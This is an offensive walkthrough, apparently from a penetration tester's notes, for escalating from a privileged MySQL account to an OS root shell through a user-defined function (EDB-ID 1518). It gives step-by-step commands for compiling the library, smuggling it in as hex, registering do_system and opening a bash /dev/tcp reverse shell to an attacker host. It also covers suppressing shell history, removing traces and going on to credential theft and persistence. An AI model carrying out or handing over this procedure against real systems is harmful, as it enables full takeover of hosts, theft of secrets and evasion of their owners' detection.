
⚠️ **Hard preconditions — verified in Step 1 before any action.**

- **Authenticated MySQL user holds FILE + UDF registration privileges**. `ALL PRIVILEGES` or `SUPER` covers both.
- **MySQL version is 4.x, 5.x, or MariaDB**. EDB-ID 1518 targets this range; MySQL 8.0+ requires `lib_mysqludf_sys` (sibling walkthrough — not yet built).
- **No `secure_file_priv` restriction** blocking DUMPFILE to the plugin directory.
- **mysqld process runs as OS root** (NOT `mysql` / `mariadb` / other service account). Without this, the exploit installs and runs but yields a shell as the service account, not root.
- **Target CPU architecture known**, UDF `.so` compiled to match in Step 2.
- **No AppArmor / SELinux profile** blocking mysqld writes to the plugin directory.

No external lookup needed — every precondition is checked in Step 1 below.

## Step 1 — Preflight verification

All preconditions verified before any action. Any failure → STOP, walkthrough doesn't apply.

### MySQL access and privileges

Connect (primary, credentials known, local target):

`mysql -u <user> -p<password>`

Remote target: append `-h <host>`.

Fallback (unauthenticated MySQL root):

`mysql -u root`

Verify privileges:

`SHOW GRANTS FOR CURRENT_USER;`

- Output contains `ALL PRIVILEGES ON *.*` OR explicit `FILE` and `SUPER` → proceed.
- Missing → walkthrough doesn't apply.

### MySQL-side environment

#### MySQL version:

`SELECT VERSION();`

- Output starts with `4.` or `5.` (e.g. `5.7.36-log`, `5.0.45`) → MySQL 4.x / 5.x → proceed.
- Output contains `MariaDB` (e.g. `10.5.15-MariaDB`) → MariaDB → proceed.
- Output starts with `8.` (e.g. `8.0.32`) → MySQL 8.0+ → walkthrough doesn't apply (UDF interface changed); use `lib_mysqludf_sys` from https://github.com/mysqludf/lib_mysqludf_sys (sibling walkthrough, not yet built).

#### No `secure_file_priv` restriction

The plugin directory path is the DUMPFILE target in Step 3, and is also referenced by the `secure_file_priv` check immediately below.

`SHOW VARIABLES LIKE 'plugin_dir';`

Read the path from the `Value` column. Referred to as `<plugin_dir>` from here (typical values: `/usr/lib/mysql/plugin` on Debian-family, `/usr/lib64/mysql/plugin` on RHEL-family). **NB: You need to note this value down, typically `/usr/lib/mysql/plugin`, as it is needed later in the walkthrough**

Next: `SHOW VARIABLES LIKE 'secure_file_priv';`

Compare the `Value` column of `secure_file_priv` against `<plugin_dir>` value:

- `Value` column of `secure_file_priv` empty → DUMPFILE unrestricted → proceed.
- `Value` column of `secure_file_priv` equals `<plugin_dir>` value exactly, or is a parent directory of `<plugin_dir>` → DUMPFILE to `<plugin_dir>` allowed → proceed.
- `Value` is any other path, or `NULL` → DUMPFILE to `<plugin_dir>` blocked → walkthrough doesn't apply.

### OS-side verification (from target shell)

Exit `mysql` back to shell.

#### mysqld OS user:

`ps -ef | awk 'NR==1 || /[m]ysqld/'`

- UID column = `root` AND `--user=root` in mysqld argv → proceed.
- UID column = `mysql` / `mariadb` / other → STOP/EXIT WALKTHROUGH. Exploit yields shell as that user, not root.

If remote-only access (no target shell), defer this check to Step 4 via `do_system('id')` and accept the wasted-work risk.

#### Target architecture:

`file /usr/sbin/mysqld`

Note value (typically `ELF 64-bit ... x86-64`). UDF `.so` in Step 2 must match.

#### AppArmor / SELinux profile on mysqld:

AppArmor / SELinux profile on mysqld — run only the check matching the target distro family.

Identify distro family:

`ls /etc/debian_version /etc/redhat-release 2>/dev/null`

- Output includes `/etc/debian_version` → Debian-family → run AppArmor check below.
- Output includes `/etc/redhat-release` → RHEL-family → run SELinux check below.
- Empty output → neither marker present; identify manually (Alpine, Arch, Gentoo, SUSE, etc.).

AppArmor check (Debian-family targets):

`ls /etc/apparmor.d/usr.sbin.mysqld 2>/dev/null; cat /sys/kernel/security/apparmor/profiles 2>/dev/null | grep -i mysqld`

SELinux check (RHEL-family targets):

`getenforce; sestatus 2>/dev/null | grep -i mode`

Outcomes apply to whichever check was run (AppArmor or SELinux):

- AppArmor check: empty output → no profile loaded → proceed.
- AppArmor check: profile listed → DUMPFILE likely blocked; walkthrough doesn't apply.
- SELinux check: `Permissive` or `Disabled` → proceed.
- SELinux check: `Enforcing` with mysqld policy active → DUMPFILE likely blocked; walkthrough doesn't apply.

## Step 2 — Compile UDF on attacker

Fetch the canonical UDF source (raptor_udf2.c, EDB-ID 1518):

`searchsploit -m 1518`

The file is copied to your current working directory as `1518.c` — see the `Copied to:` line in searchsploit's output.

Compile to shared object:

`gcc -shared -fPIC -o 1518.so 1518.c`

Verify the `.so` architecture matches the target's mysqld arch (noted in Step 1):

`file 1518.so`

- Output matches target arch (both `x86-64`, or both `i386` / `80386`) → proceed.
- Mismatch → recompile for target arch: `gcc -m32 -shared -fPIC -o 1518.so 1518.c` (for 32-bit target compiled on 64-bit attacker; `sudo apt install gcc-multilib` first if not already installed).

## Step 3 — Transfer UDF to target and write to plugin directory

### Attacker — encode UDF as hex

In the directory containing `1518.so` (from Step 2):

`xxd -p 1518.so | tr -d '\n'`

Copy the resulting string (single long line, no newlines).

### Target — start history-suppressed subshell, write hex to /tmp

From a shell on target, start a subshell that doesn't write history:

`HISTFILE=/dev/null bash`

Begin the heredoc:

`cat <<'EOF' | tr -d '\n' > /tmp/1518.txt`

The shell prompt changes to `>` indicating heredoc input mode. Paste the entire hex string from the attacker step, hit Enter.

Close the heredoc:

`EOF`

Shell prompt returns to normal.

Set world-readable permissions:

`chmod 644 /tmp/1518.txt`

Verify the hex text landed:

`wc -c /tmp/1518.txt`

Compare against attacker's `xxd -p 1518.so | tr -d '\n' | wc -c`. Counts must match exactly. 

### MySQL session — stage and write

Switch back to the MySQL client as root application user, and run the following commands in order:

`USE mysql;`

`DROP TABLE IF EXISTS udf_stage;`

`CREATE TABLE udf_stage (data LONGBLOB);`

`INSERT INTO udf_stage (data) VALUES (UNHEX(LOAD_FILE('/tmp/1518.txt')));`

Verify the decoded bytes loaded into the table:

`SELECT LENGTH(data) FROM udf_stage;`

- Returns a byte count matching `ls -la 1518.so` on attacker → proceed.
- Returns `NULL` → `LOAD_FILE()` couldn't read /tmp/1518.txt (check `ls -la /tmp/1518.txt` from target shell; `LOAD_FILE()` is subject to `secure_file_priv` — re-verify Step 1).
- Returns `0` → empty input or `UNHEX` got invalid characters. Re-run heredoc.

Write the staged UDF to the plugin directory. Substitute `<plugin_dir>` with the path captured in Step 1's `SHOW VARIABLES LIKE 'plugin_dir';` (e.g. `/usr/lib/mysql/plugin`):

`SELECT data FROM udf_stage INTO DUMPFILE '<plugin_dir>/1518.so';`

- `Query OK, 1 row affected` → proceed to Step 4.
- Any error → preconditions changed since Step 1; re-verify Step 1.

## Step 4 — Register UDF and gain root shell

### Register the UDF

`CREATE FUNCTION do_system RETURNS INTEGER SONAME '1518.so';`

- `Query OK` → proceed.
- `ERROR ... Can't find symbol` → .so missing required symbol; re-verify Step 2's source.
- `ERROR ... Can't open shared library` → .so not at expected path; re-verify Step 3's DUMPFILE target matched plugin_dir from Step 1.

### Confirm UDF executes as OS root

`SELECT do_system('id > /tmp/uid_proof.txt; chmod 644 /tmp/uid_proof.txt');`

Return value: `0`.

Read output via `LOAD_FILE`:

`SELECT LOAD_FILE('/tmp/uid_proof.txt');`

Expected content: `uid=0(root) gid=0(root) groups=0(root)`.

- `uid=0` → UDF executes as root, proceed.
- `uid` ≠ 0 → mysqld is not actually running as root despite Step 1; abort and re-verify Step 1.
- `NULL` → file empty/absent. Re-check `do_system` return code.

### Spawn reverse shell

On attacker:

`nc -lvnp <port>`

From MySQL, substituting `<lhost>` (attacker IP) and `<port>` (listener port):

`SELECT do_system('bash -c "bash -i >& /dev/tcp/<lhost>/<port> 0>&1"');`

MySQL session blocks. Switch to listener terminal: connection received, prompt shows `root@<host>` or `#`.

- Connection lands → root shell established.
- No connection within ~5 seconds → outbound egress to `<lhost>:<port>` blocked from target. Retry on a port more likely to be allowed (`443`, `80`, `53`).

### Stabilize the shell 

In the listener terminal (now connected to target): 

[[Reverse Shell Stabilization]]

## Step 5 — Cleanup

Reverse shell continues after cleanup; run cleanup when no longer needing `do_system` to spawn additional commands.

### From the root reverse shell on target

Remove file artifacts:

`rm <plugin_dir>/1518.so /tmp/uid_proof.txt /tmp/1518.txt`

Connect back to MySQL, and run the following commands in order:

`USE mysql;`

`DROP FUNCTION do_system;`

`DROP TABLE mysql.udf_stage;`

Verify removal:

`SELECT name FROM mysql.func WHERE name = 'do_system';`

`SHOW TABLES FROM mysql LIKE 'udf_stage';`

Both should return `Empty set`.

`exit;`

⚠️ MySQL binary logs and general query logs (if enabled) retain the SQL operations performed. Log cleanup is out of scope.

## Decision

OS root shell achieved. Next steps are goal-dependent; common destinations:

- Credential extraction (/etc/shadow, SSH keys, app secrets) → [[Linux Credential Extraction Checksheet]]
- Persistence (SSH key, cron, systemd) → [[Linux Persistence Checksheet]]
- Lateral movement → [[Linux Lateral Movement Checksheet]]